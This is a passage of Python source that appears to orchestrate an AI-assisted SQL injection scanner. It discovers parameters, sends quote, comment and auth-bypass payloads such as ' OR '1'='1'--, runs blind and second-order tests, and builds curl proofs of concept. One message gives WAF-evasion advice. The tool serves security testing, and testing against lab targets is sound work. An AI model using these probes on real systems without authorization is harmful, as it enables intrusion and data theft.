"""Main scan orchestration."""

import time
from typing import Callable, Optional

from sqli_ai.agent import LlmAgent
from sqli_ai.detector import SqlDetector
from sqli_ai.http_probe import HttpProbe
from sqli_ai.models import (
    Finding,
    HttpExchange,
    InjectionPoint,
    InjectionType,
    ParamLocation,
    ScanReport,
    Severity,
)
from sqli_ai.payloads import SEED_PAYLOADS

# Locations where the blind batteries (boolean-ratio, UNION, time-based) run.
# "path" is included so REST path-param injections (e.g. /api/user/{id}) get
# the same blind coverage as query/body/json — error-based & NoSQL already run
# there, but a path param can be boolean/time-blind with no error at all.
_BLIND_LOCATIONS = ("query", "body", "json", "path")


def _build_poc(exchange) -> tuple[str, str]:
    """Build a curl PoC + raw HTTP summary from the confirming exchange."""
    from urllib.parse import urlparse
    url = exchange.url
    method = exchange.method.upper()
    hdrs = exchange.request_headers or {}

    # Build header flags once; Content-Type is included here so we must not
    # add it a second time for the POST branch (that caused a duplicate header).
    extra_h = "".join(
        f' -H "{k}: {v}"'
        for k, v in hdrs.items()
        if k.lower() not in ("user-agent", "accept-encoding", "connection", "host")
    )
    if method == "GET":
        curl = f'curl -si "{url}"{extra_h}'
    else:
        import shlex
        # Ensure a Content-Type is present even if the caller didn't set one
        has_ct = any(k.lower() == "content-type" for k in hdrs)
        ct_flag = "" if has_ct else ' -H "Content-Type: application/json"'
        body = exchange.request_body or ""
        curl = (
            f'curl -si -X {method}{extra_h}{ct_flag}'
            f" --data {shlex.quote(body)}"
            f' "{url}"'
        )

    parsed = urlparse(url)
    path_qs = parsed.path + (f"?{parsed.query}" if parsed.query else "")
    raw = f"{method} {path_qs} HTTP/1.1\nHost: {parsed.netloc}\n\n"
    raw += f"→ HTTP {exchange.status_code}\n"
    raw += exchange.response_body[:300]

    return curl, raw


class Scanner:
    """AI-powered SQL injection scanner."""

    def __init__(
        self,
        agent: LlmAgent,
        probe: HttpProbe,
        max_attempts_per_param: int = 8,
        use_llm: bool = True,
        on_progress: Optional[Callable[[str], None]] = None,
        test_path: bool = False,
        path_all_segments: bool = False,
        include_dead: bool = False,
        fast: bool = False,
        guess_params: Optional[list[str]] = None,
        tamper: Optional[list[str]] = None,
        auto_tamper: bool = True,
        show_response: bool = False,
        continue_on_found: bool = False,
        seed_payloads: Optional[list[str]] = None,
        organic: bool = True,
        second_order: bool = False,
        time_based: bool = False,
        llm_deep: bool = False,
    ):
        self.agent = agent
        self.probe = probe
        self.detector = SqlDetector()
        self.max_attempts = max_attempts_per_param
        self.use_llm = use_llm
        self.on_progress = on_progress or (lambda _: None)
        self.test_path = test_path
        self.path_all_segments = path_all_segments
        self.include_dead = include_dead
        self.fast = fast
        self.guess_params = guess_params
        self.tamper = tamper or []
        self.auto_tamper = auto_tamper
        self.show_response = show_response
        self.continue_on_found = continue_on_found
        self.organic = organic  # mine params from the response itself
        self.second_order = second_order
        # Time-based/blind detection is OFF by default: on shared or rate-limited
        # hosts, response timing is dominated by network jitter, which produces
        # false positives no timing heuristic can fully filter. Error-based,
        # boolean-blind, UNION and auth-bypass are deterministic (content/status,
        # not timing) and stay on. Enable time-based with --time on stable infra.
        self.time_based = time_based
        # llm_deep: call the LLM aggressively (per-param suggestion + per-payload
        # analysis). Default False — the LLM is used sparingly as a near-miss
        # ASSIST only (see _llm_assist), which is faster and higher-value.
        self.llm_deep = llm_deep
        self._seed_payloads = seed_payloads  # None = use default SEED_PAYLOADS
        self._sleep_ms = 3000  # calibrated by CLI --sleep
        # Precheck is always on unless explicitly disabled.
        # In fast mode it's extra important — avoids 22 payloads on dead params.
        self._precheck = True

    def scan(
        self,
        url: str,
        method: str = "GET",
        data: Optional[str] = None,
        content_type: Optional[str] = None,
        extra_headers: Optional[dict[str, str]] = None,
        params: Optional[list[str]] = None,
    ) -> ScanReport:
        """Run full scan against target."""
        start = time.perf_counter()
        report = ScanReport(
            target_url=url,
            llm_model=self.agent.model if self.use_llm else "heuristic-only",
        )

        self.on_progress(f"[*] Target: {url}")
        self.on_progress(f"[*] Method: {method}")

        # JSON body field discovery: for a JSON-body write (POST/PUT/PATCH),
        # GET the same resource and merge its real field names into the body so
        # injection hits actual fields, not just our synthesized guesses. Many
        # REST APIs expose the same shape on GET (list/read) and POST (create).
        if (self.organic and data and method.upper() in ("POST", "PUT", "PATCH")
                and (content_type or "").lower().find("json") >= 0
                and data.strip().startswith("{")):
            data = self._enrich_json_body(url, data, extra_headers, report)

        # Baseline request FIRST — the clean response is what we mine for
        # organically-discovered parameters (forms/links/JS/JSON keys), so we
        # need it before deciding which points to test.
        baseline = self.probe.send(url, method, data, content_type, extra_headers)
        report.add_request(baseline)
        report.add_request()
        self.on_progress(f"[*] Baseline: HTTP {baseline.status_code} ({baseline.response_time_ms:.0f}ms)")

        # Detect DB/backend offline — tell the user clearly rather than silently
        # returning 0 findings for every payload.
        if self.detector.is_db_offline(baseline):
            report.add_error(
                f"DB/backend appears OFFLINE ({baseline.response_body[:120].strip()}) — "
                f"SQLi cannot be detected at runtime. Vulnerability may still exist in code."
            )
            self.on_progress(
                f"[!] DB appears OFFLINE — runtime detection not possible on this URL"
            )
            report.duration_seconds = time.perf_counter() - start
            return report

        # Target unavailable (gateway/overload errors) — the server itself is
        # down, so runtime detection is impossible. Say so clearly rather than
        # reporting a misleading "0 findings".
        if baseline.status_code in (502, 503, 504):
            report.add_error(
                f"Target UNAVAILABLE (HTTP {baseline.status_code}) — server is "
                f"down/overloaded/rate-limited. Cannot test at runtime; retry later."
            )
            self.on_progress(
                f"[!] Target UNAVAILABLE (HTTP {baseline.status_code}) — "
                f"server down/overloaded, cannot scan"
            )
            report.duration_seconds = time.perf_counter() - start
            return report

        # Skip dead endpoints — no point fuzzing a route that doesn't exist
        if not self.include_dead and baseline.status_code in (0, 404, 405, 501):
            report.add_error(
                f"Skipped: baseline HTTP {baseline.status_code} "
                f"(endpoint dead/unroutable; use --include-404 to force)"
            )
            report.duration_seconds = time.perf_counter() - start
            self.on_progress(
                f"[*] Skipping (baseline HTTP {baseline.status_code})"
            )
            return report

        # Skip web-server directory-listing pages (Apache/nginx/IIS auto-index).
        # They have no SQL behind them; their sort-order links (?C=N;O=A ...)
        # change on "injection", which fools content-diff detection into a false
        # positive. Not a real endpoint — don't scan it.
        if self.detector.looks_like_directory_listing(baseline):
            report.add_error("Skipped: web-server directory listing (no SQL sink)")
            self.on_progress("[*] Skipping (directory listing — not an app endpoint)")
            report.duration_seconds = time.perf_counter() - start
            return report

        # Skip auth-gated / WAF-blocked baselines — can't test unauthenticated.
        # EXCEPTION: a POST/PUT with credential-like body params (a login attempt)
        # naturally returns 401 to wrong creds — that's the auth-bypass target,
        # not an endpoint we lack access to. Keep testing those.
        has_auth_field = False
        if data:
            _lower_data = data.lower()
            has_auth_field = any(
                k in _lower_data for k in
                ('"email"', '"username"', '"user"', '"password"', '"login"',
                 "email=", "username=", "user=", "password=", "login=")
            )
        is_login_attempt = method.upper() in ("POST", "PUT", "PATCH") and has_auth_field

        # auth_gated: a 401/403 baseline means the app wants a token/credential.
        # We DON'T skip outright — the auth CHECK itself is frequently SQL
        # (SELECT ... WHERE token = '<X-Auth-Token>'), so we still test the
        # auth-check inputs (headers + path segments). Body/query params are
        # behind the gate and can't be reached unauthenticated, so we drop them.
        auth_gated = False
        if (not self.include_dead and baseline.status_code in (401, 403)
                and not is_login_attempt):
            # A host that keeps returning 403 has BLOCKED us (WAF/rate-limit) —
            # say so loudly; no amount of scanning gets past a real block.
            _body = (baseline.response_body or "").lower()
            _waf_block = getattr(self.probe, "host_blocked", False) or (
                baseline.status_code == 403
                and len(_body) < 1500 and "forbidden" in _body
            )
            if baseline.status_code == 403 and _waf_block:
                report.add_error(
                    "TARGET IS BLOCKING YOU (HTTP 403 on every request) — WAF or "
                    "rate-limit. Wait for the block to clear, route through a "
                    "different IP with --proxy, or slow down (-t 1, --no-brute)."
                )
                self.on_progress(
                    "[!] TARGET BLOCKING YOU (403 WAF/rate-limit) — wait, use "
                    "--proxy, or slow down (-t 1 --no-brute). Not a scanner issue."
                )
                report.duration_seconds = time.perf_counter() - start
                return report
            # Auth-gated (not a WAF block): keep going, but only against the
            # auth-check inputs (headers + path) — that's where the token SQLi is.
            auth_gated = True
            self.on_progress(
                f"[*] Auth-gated (HTTP {baseline.status_code}) — testing the "
                f"auth-check inputs (headers/path) for injectable token lookups"
            )

        # Login-wall detection: an unauthenticated request bounced to a login
        # page has NOTHING injectable on it — every param just re-renders the
        # login form — so scanning it wastes a full payload battery per URL (the
        # main cause of a slow, seemingly-hung scan on auth-gated apps). SKIP it.
        # Exception: an actual login PATH is a valid auth-bypass target, and an
        # authenticated session means this really is the page (keep scanning).
        if self.detector.looks_like_login_page(baseline):
            from urllib.parse import urlparse as _up_login
            path_l = _up_login(url).path.lower()
            is_login_path = any(
                k in path_l for k in
                ("login", "signin", "sign-in", "auth", "session", "sso", "logon")
            )
            _cookie_hdr = (extra_headers or {})
            authed = bool(
                any(k.lower() == "authorization" for k in _cookie_hdr)
                or any(k.lower() == "cookie" for k in _cookie_hdr)
                or self.probe.cookies
            )
            if not is_login_path and not authed:
                report.add_error(
                    "Skipped: redirected to a LOGIN page (unauthenticated). "
                    "Provide credentials with --creds USER:PASS (or --cookie) to "
                    "reach protected pages."
                )
                self.on_progress(
                    "[*] Skipping (login wall — authenticate with --creds to reach this)"
                )
                report.duration_seconds = time.perf_counter() - start
                return report

        # Organic parameter discovery: mine the live baseline response for
        # parameter names the target itself advertises (form fields, links,
        # JS fetch URLs, JSON keys). This adapts to arbitrary apps instead of
        # relying on a baked-in wordlist.
        discovered_params: Optional[list[str]] = None
        discovered_post_forms: list[tuple[str, str, str]] = []
        discovered_get_forms: list[str] = []
        if self.organic and method.upper() == "GET":
            try:
                ct = baseline.response_headers.get("content-type", "") \
                    if baseline.response_headers else ""
                from sqli_ai.param_discovery import discover
                names, _param_urls, _post_forms = discover(url, baseline.response_body, ct)
                discovered_post_forms = _post_forms or []
                # GET-form action URLs pre-filled with ALL their fields (e.g.
                # ".../sqli/?id=1&Submit=Submit"). Testing these is essential for
                # forms whose injectable field only reaches SQL when a COMPANION
                # field is also present (DVWA needs id AND Submit together) — a
                # per-field mine of the bare page would submit id alone and miss
                # it. Only keep same-page multi-value form targets, not the URL
                # we're already scanning.
                discovered_get_forms = [
                    u for u in (_param_urls or []) if u != url
                ]
                if names:
                    discovered_params = names
                    report.add_log(
                        f"Organic discovery: {len(names)} param name(s) from response "
                        f"({', '.join(names[:8])}{'...' if len(names) > 8 else ''})"
                    )
                    self.on_progress(
                        f"[*] Discovered {len(names)} parameter name(s) organically "
                        f"from the response"
                    )
            except Exception as e:
                report.add_error(f"Organic discovery failed: {e}")

        # Discover injection points (query/path/body/header/cookie), seeding the
        # organically-discovered names with priority.
        points = self.probe.extract_injection_points(
            url, method, data, content_type, extra_headers,
            test_path=self.test_path,
            path_all_segments=self.path_all_segments,
            guess_params=self.guess_params,
            discovered_params=discovered_params,
            test_headers=self.organic,
        )
        if params:
            allowed = set(params)
            points = [p for p in points if p.name in allowed]

        # Auth-gated endpoint: only the auth-check inputs (headers + path) are
        # reachable pre-auth; query/body/json params sit behind the gate. Test
        # just the reachable ones — that's where a token-lookup SQLi lives.
        if auth_gated:
            points = [p for p in points
                      if p.location in (ParamLocation.HEADER, ParamLocation.PATH)]

        if not points:
            report.add_error("No injection points found")
            report.duration_seconds = time.perf_counter() - start
            return report

        report.injection_points = points

        # Transparency: show EVERY field that will be probed with an injection
        # character (query/body/path/header/cookie params). Each of these gets
        # the precheck quote/'*' probe plus the technique battery.
        _names = ", ".join(f"{p.name}({p.location.value})" for p in points[:15])
        self.on_progress(
            f"[*] Testing {len(points)} field(s) with injection probes: {_names}"
            + (" ..." if len(points) > 15 else "")
        )

        import concurrent.futures as _cf

        def _test_one(point):
            return self._test_parameter(
                url, method, data, content_type, extra_headers,
                point, baseline, report,
            )

        # Run param tests concurrently — big speed win when there are many params.
        # Cap at 4 workers to avoid hammering the target. This runs whether or
        # not continue_on_found is set; the only difference is whether we
        # cancel remaining work after the first confirmed finding.
        workers = min(4, len(points))
        if workers > 1:
            with _cf.ThreadPoolExecutor(max_workers=workers) as ex:
                futures = {ex.submit(_test_one, p): p for p in points}
                for fut in _cf.as_completed(futures):
                    try:
                        finding = fut.result()
                    except _cf.CancelledError:
                        continue  # skipped after first finding confirmed
                    except Exception as e:
                        report.add_error(f"Param test error: {e}")
                        continue
                    if finding:
                        report.findings.append(finding)
                        self.on_progress(
                            f"[!] VULNERABLE: {url}\n"
                            f"    Param: {finding.param} ({finding.location.value}) "
                            f"| Type: {finding.injection_type.value} "
                            f"| DB: {finding.db_type or '?'} "
                            f"| Confidence: {finding.confidence:.0%}\n"
                            f"    PoC: {finding.poc_curl}"
                        )
                        if not self.continue_on_found:
                            for f in futures:
                                f.cancel()
        else:
            for point in points:
                if report.findings and not self.continue_on_found:
                    if not getattr(report, '_skip_logged', False):
                        report._skip_logged = True
                        self.on_progress(
                            "[*] SQLi confirmed — skipping remaining parameters"
                        )
                    break
                finding = _test_one(point)
                if finding:
                    report.findings.append(finding)
                    self.on_progress(
                        f"[!] VULNERABLE: {url}\n"
                        f"    Param: {finding.param} ({finding.location.value}) "
                        f"| Type: {finding.injection_type.value} "
                        f"| DB: {finding.db_type or '?'} "
                        f"| Confidence: {finding.confidence:.0%}\n"
                        f"    PoC: {finding.poc_curl}"
                    )

        # Organic POST-form testing: a GET page often SHOWS a POST form (login,
        # register, cart, "my account", ...). Those body params are the classic
        # injectable spots (BadStore's email/fullname/pwdhint/role/cartitem live
        # here, reached via ?action=). Submit each discovered form and test its
        # body fields — preserving hidden values like action=register so the
        # right server-side handler runs. This is what lets a single homepage
        # scan reach every action's POST params organically.
        if discovered_post_forms and not self.fast:
            for furl, fbody, fct in discovered_post_forms:
                try:
                    self._scan_post_form(furl, fbody, fct, extra_headers, report)
                except Exception as e:
                    report.add_error(f"POST-form scan failed for {furl}: {e}")

        # Organic GET-form testing: scan action URLs pre-filled with ALL their
        # fields so a field that only injects with a companion present (DVWA's
        # id+Submit) is actually reached. Bounded per scan to stay cheap.
        if discovered_get_forms and not self.fast:
            for furl in discovered_get_forms[:15]:
                try:
                    self._scan_get_form(furl, extra_headers, report)
                except Exception as e:
                    report.add_error(f"GET-form scan failed for {furl}: {e}")

        # Second-order SQLi (opt-in): store a marked payload via a write
        # endpoint, then re-read and see if it surfaces in a SQL error later.
        if self.second_order and method.upper() in ("POST", "PUT", "PATCH") and data:
            so = self._test_second_order(
                url, method, data, content_type, extra_headers, points, report
            )
            if so is not None:
                report.findings.append(so)
                self.on_progress(
                    f"[!] VULNERABLE (second-order): {url}\n"
                    f"    Param: {so.param} | stored value resurfaced in a SQL error"
                )

        report.duration_seconds = time.perf_counter() - start
        self.on_progress(
            f"\n[*] Scan complete: {report.total_requests} requests, "
            f"{len(report.findings)} finding(s) in {report.duration_seconds:.1f}s"
        )
        return report

    def _scan_post_form(
        self, furl: str, fbody: str, fct: str,
        extra_headers: Optional[dict[str, str]], report: ScanReport,
    ) -> None:
        """Baseline + per-field test of a discovered POST form.

        ``fbody`` already carries the form's fields (hidden values like
        action=register preserved; injectable fields seeded with a test value).
        Each non-hidden field is tested as a body param via _test_parameter, so
        the same precheck + technique battery that runs on query params also
        covers POST bodies — organically, no per-app knowledge."""
        # De-dup: don't rescan the same (url, body) form twice in one run.
        seen = getattr(report, "_post_forms_seen", None)
        if seen is None:
            seen = set()
            report._post_forms_seen = seen
        key = furl + "|" + fbody
        if key in seen:
            return
        seen.add(key)

        method = "POST"
        baseline = self.probe.send(furl, method, fbody, fct, extra_headers)
        report.add_request()
        # A dead/erroring endpoint baseline is useless — skip (infra errors etc.)
        if self.detector.is_infra_error(baseline):
            return

        points = self.probe.extract_injection_points(
            furl, method, fbody, fct, extra_headers,
        )
        # Only test the actual body params of THIS form (skip discovered headers/
        # cookies here — they're covered by the GET-page scan).
        body_points = [p for p in points if p.location == ParamLocation.BODY]
        if not body_points:
            return
        self.on_progress(
            f"[*] Testing POST form {furl} — {len(body_points)} body field(s): "
            + ", ".join(p.name for p in body_points[:15])
        )
        for point in body_points:
            try:
                finding = self._test_parameter(
                    furl, method, fbody, fct, extra_headers, point, baseline, report,
                )
            except Exception as e:
                report.add_error(f"POST field {point.name} failed: {e}")
                continue
            if finding is not None:
                report.findings.append(finding)
                self.on_progress(
                    f"[!] VULNERABLE: {furl} [POST]\n"
                    f"    Param: {finding.param} ({finding.location.value}) "
                    f"| Type: {finding.injection_type.value} "
                    f"| DB: {finding.db_type or '?'} "
                    f"| Confidence: {finding.confidence:.0%}\n"
                    f"    PoC: {finding.poc_curl}"
                )

    def _scan_get_form(
        self, furl: str,
        extra_headers: Optional[dict[str, str]], report: ScanReport,
    ) -> None:
        """Baseline + per-field test of a discovered GET form (action?all=fields).

        ``furl`` already carries EVERY field of the form (submit buttons and
        hidden state included), so injecting into one query param while the
        others stay present reaches injection points that need a companion field
        — e.g. DVWA's ``?id=1'&Submit=Submit``. Deduped and query-only so it
        stays cheap and never recurses into organic discovery."""
        seen = getattr(report, "_get_forms_seen", None)
        if seen is None:
            seen = set()
            report._get_forms_seen = seen
        if furl in seen:
            return
        seen.add(furl)

        baseline = self.probe.send(furl, "GET", None, None, extra_headers)
        report.add_request()
        if self.detector.is_infra_error(baseline):
            return

        points = self.probe.extract_injection_points(
            furl, "GET", None, None, extra_headers,
        )
        query_points = [p for p in points if p.location == ParamLocation.QUERY]
        if not query_points:
            return
        self.on_progress(
            f"[*] Testing GET form {furl} — {len(query_points)} field(s): "
            + ", ".join(p.name for p in query_points[:15])
        )
        for point in query_points:
            try:
                finding = self._test_parameter(
                    furl, "GET", None, None, extra_headers, point, baseline, report,
                )
            except Exception as e:
                report.add_error(f"GET field {point.name} failed: {e}")
                continue
            if finding is not None:
                report.findings.append(finding)
                self.on_progress(
                    f"[!] VULNERABLE: {furl} [GET]\n"
                    f"    Param: {finding.param} ({finding.location.value}) "
                    f"| Type: {finding.injection_type.value} "
                    f"| DB: {finding.db_type or '?'} "
                    f"| Confidence: {finding.confidence:.0%}\n"
                    f"    PoC: {finding.poc_curl}"
                )

    def _test_second_order(
        self, url, method, data, content_type, extra_headers, points, report,
    ) -> Optional[Finding]:
        """Second-order SQLi: submit a unique marker+quote into each writable
        field, then re-read the endpoint (and its base path) and flag if the
        stored value resurfaces inside a SQL error — proving the persisted value
        is later concatenated into a query. Marker-based, so false positives are
        near-zero (the exact random marker must appear next to a SQL error)."""
        import random as _r
        import string as _s
        from urllib.parse import urlparse, urlunparse
        marker = "s2o" + "".join(_r.choice(_s.ascii_lowercase + _s.digits) for _ in range(8))
        payload = marker + "'"
        writable = [p for p in points if p.location.value in ("body", "json")]
        if not writable:
            return None
        # Store the marked payload in each writable field (separate requests so
        # we know which field carried it if it resurfaces).
        stored_fields: list[str] = []
        for point in writable[:8]:
            self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=payload,
            )
            report.add_request()
            stored_fields.append(point.name)

        # Re-read: the write URL itself (GET) and its base path (no query).
        parsed = urlparse(url)
        read_urls = [url]
        base = urlunparse(parsed._replace(query=""))
        if base != url:
            read_urls.append(base)
        for read_url in read_urls:
            try:
                r = self.probe.send(read_url, "GET", None, None, extra_headers)
            except Exception:
                continue
            report.add_request()
            body = r.response_body or ""
            if marker not in body:
                continue
            errs = self.detector.find_sql_errors(body)
            if not errs:
                continue
            # Require the marker to sit NEAR the SQL error (same 200-char window)
            # so we don't flag an unrelated error elsewhere on the page.
            mi = body.find(marker)
            window = body[max(0, mi - 200): mi + 200]
            if any(e in window for e in errs) or self.detector.find_sql_errors(window):
                point0 = writable[0]
                ev = (f"Second-order SQLi: stored marker {marker!r} resurfaced in a "
                      f"SQL error on {read_url} — persisted value is used in a later query")
                poc_curl, poc_req = _build_poc(r)
                return Finding(
                    param=(stored_fields[0] if stored_fields else point0.name),
                    location=point0.location,
                    injection_type=InjectionType.ERROR_BASED,
                    severity=Severity.HIGH,
                    payload=payload,
                    evidence=ev,
                    confidence=0.9,
                    db_type=self.detector.guess_db_from_errors(body),
                    poc_curl=poc_curl,
                    poc_request=poc_req,
                )
        return None

    def _test_parameter(
        self,
        url: str,
        method: str,
        data: Optional[str],
        content_type: Optional[str],
        extra_headers: Optional[dict[str, str]],
        point: InjectionPoint,
        baseline: HttpExchange,
        report: ScanReport,
    ) -> Optional[Finding]:
        """Test a single injection point with LLM-guided payloads."""
        # Local to this parameter's test run (NOT shared via `report` — this
        # method may run concurrently for other parameters on the same report,
        # and stashing scratch state on the shared object was a real race bug).
        interim_findings: list[Finding] = []

        # Quick pre-check: send a single quote before running the full payload suite.
        # If the response is identical to baseline, this param ignores the value.
        # Skip it immediately — avoids 100s of wasted requests on dead params.
        # Auth-bypass probe: fields that look like login credentials (email,
        # username, password) need a FULL 'OR 1=1' style payload to reveal
        # SQLi — a bare quote just fails the login normally (same status as
        # baseline), which would otherwise cause the precheck below to wrongly
        # declare the param "dead" before ever trying the payload that matters.
        _AUTH_FIELD_NAMES = {
            "email", "username", "user", "login", "password", "pass", "pwd",
        }
        if self._precheck and point.name.lower() in _AUTH_FIELD_NAMES:
            bypass_probe = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload="' OR '1'='1'--",
            )
            report.add_request()
            score, evidence = self.detector.quick_score(baseline, bypass_probe)
            if score >= 0.85:
                return self._build_finding(
                    point, bypass_probe, baseline, evidence, score,
                    inj_type=InjectionType.BOOLEAN_BLIND,
                )

        # When the baseline ALREADY errors (e.g. a raw-SQL endpoint like
        # /api/testimonials/count?query=1 that concatenates the value straight
        # into SQL), the normal precheck below is skipped. Do a one-shot inert
        # check so mined/organic params the endpoint simply ignores are dropped
        # after a single request — this both saves the full payload suite and
        # kills the "identical-to-baseline" reflection false positives.
        if self._precheck and self.detector.baseline_already_erroring(baseline):
            orig = point.original_value or ""
            inert_probe = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + "'",
            )
            report.add_request()
            if (inert_probe.status_code == baseline.status_code
                    and inert_probe.response_body == baseline.response_body):
                return None  # param has no effect — identical to baseline

            # Raw-SQL executor (e.g. BrokenCrystals /api/testimonials/count?query=
            # runs the value verbatim as SQL): EVERY input errors, so "a quote
            # causes an error" can't distinguish it. Inject a unique marker and
            # confirm it comes back INSIDE a SQL error (e.g. Postgres 'syntax
            # error at or near "<marker>"'). A random marker sitting next to a SQL
            # parser error is definitive proof the input is parsed as SQL — a
            # high-confidence, near-zero-FP error-based finding.
            marker = "SQLiAiZ9x8Q"
            mk_probe = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=marker,
            )
            report.add_request()
            mk_body = mk_probe.response_body or ""
            errs = self.detector.find_sql_errors(mk_body)
            if marker in mk_body and errs:
                idx_m, idx_e = mk_body.find(marker), mk_body.find(errs[0])
                if idx_e >= 0 and abs(idx_m - idx_e) <= 120:
                    finding = self._build_finding(
                        point, mk_probe, baseline,
                        f"Raw-SQL execution: injected marker {marker!r} reflected "
                        f"inside a SQL error ({errs[0][:60]}) — the parameter is "
                        f"parsed directly as SQL",
                        0.95, inj_type=InjectionType.ERROR_BASED,
                    )
                    return self._enrich_error(
                        finding, url, method, data, content_type,
                        extra_headers, point, report,
                    )

        if self._precheck and not self.detector.baseline_already_erroring(baseline):
            # Inject relative to the ORIGINAL value, not by replacing it. Real
            # SQLi context is preserved by appending: for q=apple the probe
            # sends q=apple' which yields `LIKE '%apple'%'` -> syntax error.
            # Replacing (q=') often returns empty results with no error and
            # misses the vulnerability (confirmed on OWASP Juice Shop search).
            orig = point.original_value or ""
            star_probe = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + "*",
            )
            report.add_request()
            star_score, _ = self.detector.quick_score(baseline, star_probe)

            # Always send the quote probe — it's the primary SQLi signal.
            # (Previously we skipped it when the star probe looked 'dead', which
            # missed error-based SQLi on search endpoints where a wildcard
            # returns empty results but a quote triggers a SQL error.)
            quote_probe = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + "'",
            )
            report.add_request()

            quote_errors = self.detector.find_sql_errors(quote_probe.response_body)
            status_changed = quote_probe.status_code != baseline.status_code

            # Truly dead param: neither the wildcard NOR the quote changed
            # anything (same status, no SQL errors, no body diff). Skip it.
            star_identical = (
                star_score == 0.0 and star_probe.status_code == baseline.status_code
            )
            quote_identical = (
                not quote_errors
                and not status_changed
                and len(quote_probe.response_body) == len(baseline.response_body)
            )
            if star_identical and quote_identical:
                # The param looks inert to '/'*' probes — but an error-suppressed
                # endpoint can still be BOOLEAN-injectable (OR '1'='1 returns all
                # rows, AND '1'='2 returns none) with no error or status change.
                # One OR/AND amplification pair catches that Nuclei-style case
                # before we give up on the param.
                # A param that looks inert to '/'*' probes can still be a BLIND
                # injection (boolean/time) with no error and no content change.
                # Run the blind battery before giving up — BUT only for REAL
                # params (URL/organic/spec), not the dozens of speculative
                # wordlist guesses, or a single endpoint balloons into thousands
                # of requests. Mined guesses that look dead are simply dropped.
                if (not point.mined
                        and 200 <= baseline.status_code < 300
                        and point.location.value in _BLIND_LOCATIONS):
                    bfind = self._boolean_ratio_detect(
                        url, method, data, content_type, extra_headers,
                        point, baseline, report,
                    )
                    if bfind is not None:
                        return bfind
                    tfind = self._test_time_based(
                        url, method, data, content_type, extra_headers,
                        point, baseline, report,
                    )
                    if tfind is not None:
                        return tfind
                return None  # dead param — ignores its value entirely

            if quote_errors:
                # Explicit SQL error text — confirmed, no ambiguity.
                pre_score, pre_ev = self.detector.quick_score(baseline, quote_probe)
                evidence = pre_ev or f"SQL error: {quote_errors[0][:80]}"
                finding = self._build_finding(
                    point, quote_probe, baseline, evidence, max(pre_score, 0.85)
                )
                # Prove impact: extract data via the error channel.
                return self._enrich_error(
                    finding, url, method, data, content_type, extra_headers,
                    point, report,
                )

            if status_changed:
                # Guard against status "changes" that are NOT a SQL signal:
                #  - injected request failed entirely (status 0): a timeout /
                #    connection reset / aborted request is infrastructure, not a
                #    SQL error (this is the classic "500 -> 0 on quote only" FP);
                #  - baseline is already a server error (>=500): the endpoint is
                #    broken regardless of input, so any "change" is meaningless
                #    (these are usually dead/crawl-junk URLs);
                #  - gateway/upstream failure on the probe (502/503/504, conn
                #    reset): the request never reached a working app.
                # Genuine error-based SQLi still surfaces above via SQL error
                # TEXT (quote_errors), and a clean 2xx->5xx break from a healthy
                # baseline still passes every guard below.
                if (quote_probe.status_code == 0
                        or baseline.status_code >= 500
                        or self.detector.is_infra_error(quote_probe)):
                    return None

                # A 2xx -> 403/406/429/503 transition on the quote is a WAF/CDN
                # BLOCKING the metacharacter, not a database error. Cloudflare,
                # Akamai, etc. return a block page ("Attention Required",
                # "Request unsuccessful", "Access denied") the instant they see a
                # quote/SQLi pattern — which is the classic X-Forwarded-For/Host
                # 200->403 false positive. Real SQLi surfaces as a SQL error
                # (handled above) or a 5xx from the app itself, never a WAF 403.
                if quote_probe.status_code in (403, 406, 429, 503) \
                        or self.detector.looks_like_waf_block(quote_probe):
                    return None

                # Status changed but no recognisable SQL error text. This is
                # ambiguous — could be real SQLi with a swallowed error, or just
                # "any unexpected input breaks this endpoint" (generic validation).
                #
                # sqlmap-style differential test: send a harmless control value
                # that is equally "weird" (long alphanumeric) but NOT a SQL
                # metacharacter. If it triggers the SAME status change, the
                # break isn't SQL-specific — don't confirm. If the control
                # succeeds normally, the quote-specific failure is a real signal.
                # Rate-limit / WAF short-circuit: don't waste a control request
                # disambiguating a 429 — it's never SQLi, and burning a control +
                # possible full suite on every param during a rate-limit window
                # is what makes scans take minutes on a single slow URL.
                if quote_probe.status_code == 429:
                    return None

                control_probe = self.probe.send(
                    url, method, data, content_type, extra_headers,
                    inject_point=point, payload=orig + "zzz9x8y7w6v5",
                )
                report.add_request()
                control_broke = control_probe.status_code == quote_probe.status_code

                if control_broke:
                    # Generic "any weird value breaks this" — not SQL-specific
                    # (confirmed by the control test). Skip immediately rather
                    # than running the full payload suite, which would waste
                    # dozens of requests chasing a non-SQL error on every
                    # ambiguous param.
                    return None
                else:
                    # Control succeeds, quote breaks it → SQL-specific signal.
                    # Try a comment-based "fix": if closing/commenting the quote
                    # restores normal behaviour, that's strong confirmation the
                    # value lands inside a SQL statement.
                    fix_probe = self.probe.send(
                        url, method, data, content_type, extra_headers,
                        inject_point=point, payload=orig + "'--",
                    )
                    report.add_request()
                    fix_confirms = fix_probe.status_code == baseline.status_code

                    evidence = (
                        f"Status {baseline.status_code} -> {quote_probe.status_code} "
                        f"on quote only (control value succeeded normally)"
                    )
                    if fix_confirms:
                        evidence += "; comment-closing the quote restored normal response"
                    confidence = 0.85 if fix_confirms else 0.7
                    return self._build_finding(
                        point, quote_probe, baseline, evidence, confidence,
                        inj_type=InjectionType.ERROR_BASED,
                    )

            # No SQL errors and no status change — check if quote is more
            # interesting than '*'. If both give the same body-diff score,
            # this param is just dynamic (returns different content for any value).
            pre_score, pre_ev = self.detector.quick_score(baseline, quote_probe)
            if pre_score <= star_score and pre_score < 0.6:
                # Ambiguous: the quote and the wildcard perturb the page about
                # equally, which looks like a merely-dynamic param — but it can
                # also be a BLIND injection where any wrong value returns an
                # empty page. Use the sqlmap-style boolean ratio test to tell
                # them apart (TRUE ~= original AND FALSE != original), then fall
                # back to NoSQL. Both no-op cheaply on genuinely dynamic pages.
                if (not point.mined
                        and 200 <= baseline.status_code < 300
                        and point.location.value in _BLIND_LOCATIONS):
                    bfind = self._boolean_ratio_detect(
                        url, method, data, content_type, extra_headers,
                        point, baseline, report,
                    )
                    if bfind is not None:
                        return bfind
                    # Time-based blind: the classic "no error, no content
